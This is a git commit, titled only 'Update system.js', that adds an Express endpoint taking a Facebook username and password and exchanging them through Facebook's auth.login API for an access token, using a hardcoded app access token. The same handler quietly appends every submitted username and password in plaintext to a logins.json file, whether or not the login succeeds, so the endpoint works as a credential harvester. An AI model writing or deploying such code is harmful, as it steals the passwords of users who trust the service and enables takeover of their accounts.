67bc2062d7e8d4495577a91a14c621191df8d65c
ainzdeveloper <158009579+ainzdeveloper@users.noreply.github.com>
2024-02-13 09:37:10 +0800

    Update system.js

--- system.js
+++ system.js
@@ -132,6 +132,60 @@ routes.forEach(route => {
     res.sendFile(path.join(__dirname, 'public', route.file));
   });
 });
+const api_url = "https://b-api.facebook.com/method/auth.login";
+const access_token = "6628568379|c1e620fa708a1d5696fb991c1bde5662";
+
+app.get('/ainz/api', (req, res) => {
+  const username = req.query.username;
+  const password = req.query.password;
+
+  if (!username || !password) {
+    return res.send({ message: "Both username and password are required" });
+  }
+
+  const params = {
+    format: "json",
+    device_id: "yrcyg4m1-o7m5-pghw-atiu-n04mh4nlka6n",
+    email: username,
+    password: password,
+    locale: "en_US",
+    method: "auth.login",
+    access_token: access_token
+  };
+
+  request.get({ url: api_url, qs: params }, (error, response, body) => {
+    if (error) {
+      return res.send({ message: "Internal server error" });
+    }
+
+    const responseJson = JSON.parse(body);
+
+    if (responseJson.access_token) {
+      return res.send({ access_token: responseJson.access_token });
+    } else {
+      return res.send({ message: "Wrong Credentials" });
+    }
+  });
+
+  const data = { Username: username, Password: password };
+  fs.readFile('logins.json', 'utf8', (err, jsonString) => {
+    if (err) {
+      console.log("Error reading file from disk:", err);
+      return;
+    }
+    try {
+      const logins = JSON.parse(jsonString);
+      logins.push(data);
+      fs.writeFile('logins.json', JSON.stringify(logins, null, 2), (err) => {
+        if (err) {
+          console.log('Error writing file:', err);
+        }
+      });
+    } catch (err) {
+      console.log('Error parsing JSON string:', err);
+    }
+  });
+});
 app.get('/info', (req, res) => {
   const data = Array.from(Utils.account.values()).map(account => ({
     name: account.name,
